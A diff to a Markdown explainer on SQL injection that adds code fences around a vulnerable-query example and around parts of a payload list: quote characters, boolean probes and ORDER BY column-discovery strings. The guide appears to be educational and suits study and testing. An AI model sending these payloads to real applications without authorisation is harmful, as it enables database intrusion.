@@ -16,10 +16,10 @@ Common causes include:
 
 ### Example of a Vulnerable Query
 
-
+```python
 SELECT * FROM users
 WHERE username = 'user_input';
-
+```
 If user input is directly inserted into a query, the database may interpret that input as part of the SQL command instead of ordinary data.
 
 ### Types of SQL Injection
@@ -45,6 +45,7 @@ Uses differences in response timing to infer application behavior.
 Malicious input is stored by the application and executed later.
 
 ####Generic SQL Injection Payloads
+```python
 '
 ''
 `
@@ -79,9 +80,9 @@ Malicious input is stored by the application and executed later.
 
 @variable local variable
 @@variable global variable
-
+```
 ####Numeric
-
+```sql
 AND 1
 AND 0
 AND true
@@ -90,7 +91,7 @@ AND false
 1-true
 1*56
 -2
-
+```
 ####Table and Column Discovery
 1' ORDER BY 1--+
 1' ORDER BY 2--+
